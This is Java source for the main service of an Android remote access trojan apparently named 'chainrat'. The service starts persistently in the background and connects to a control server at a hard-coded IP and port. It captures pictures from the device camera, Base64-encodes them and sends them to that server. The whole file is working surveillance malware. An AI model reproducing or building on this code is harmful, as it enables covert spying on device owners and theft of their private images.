package com.nefi.chainrat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.nefi.chainrat.camera.APictureCapturingService;
import com.nefi.chainrat.camera.PictureCapturingListener;
import com.nefi.chainrat.camera.PictureCapturingServiceImpl;
import com.nefi.chainrat.networking.ChainControlClient;
import com.nefi.chainrat.networking.CommandType;
import com.nefi.chainrat.networking.packets.Packet;

import java.lang.reflect.Type;


public class MainService extends Service implements PictureCapturingListener {

    private static APictureCapturingService pictureService;
    public static APictureCapturingService getPictureService(){
        return pictureService;
    }
    private static GsonBuilder gsonBuilder = new GsonBuilder();
    private static Gson gson = gsonBuilder.create();
    public static String serialize(Object obj, Type type){
        return gson.toJson(obj, type);
    }
    public static Object deserialize(String msg, Type type){
        return gson.fromJson(msg, type);
    }

    private static MainService instance;
    public static MainService getInstance(){
        return instance;
    }

    private static final String TAG = "MainService";

    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }



    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2){
        Log.d(TAG, "Trying to start service");
        instance = this;
        //Get Cameramanager instance
        pictureService = PictureCapturingServiceImpl.getInstance(MainActivity.getAppContext());

        //Start connecting
        ChainControlClient client = new ChainControlClient("192.168.0.87", 8084);

        Thread t = new Thread(client);
        t.start();

        Log.d(TAG, "Endlich geschafft, der Service läuft der Service ist ready :)");
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onCaptureDone(byte[] pictureData) {
        String encodedString = Base64.encodeToString(pictureData, Base64.DEFAULT);
        Packet out = new Packet(CommandType.IMAGE, new String(encodedString));
        Log.d(TAG, "GOT IMAGE");
        MainActivity.getChannel().writeAndFlush(out);
    }
}